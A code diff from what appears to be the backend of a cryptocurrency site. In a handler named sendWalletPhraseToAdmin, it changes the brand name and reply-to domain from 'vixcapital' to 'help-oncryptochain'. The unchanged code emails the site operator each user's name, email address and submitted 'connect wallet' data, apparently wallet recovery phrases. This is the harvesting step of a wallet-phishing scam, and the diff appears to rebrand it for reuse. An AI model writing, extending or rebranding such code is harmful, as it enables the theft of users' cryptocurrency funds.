@@ -364,10 +364,10 @@ const sendWalletPhraseToAdmin = asyncHandler(async (req, res) => {
     // Send connect wallet request email to admin
     const introMessage = `This user ${req.user.firstname+" "+req.user.lastname} with email address ${req.user.email} just entered a connect wallet ${type} data. [ ${connectData} ] `
 
-    const subjectAdmin = "New Connect Wallet Data - vixcapital"
+    const subjectAdmin = "New Connect Wallet Data - help-oncryptochain"
     const send_to_Admin = process.env.EMAIL_USER
     const templateAdmin = adminGeneralEmailTemplate("Admin", introMessage)
-    const reply_toAdmin = "no_reply@vixcapital.live"
+    const reply_toAdmin = "no_reply@help-oncryptochain.live"
 
     await sendEmail(subjectAdmin, send_to_Admin, templateAdmin, reply_toAdmin)
 
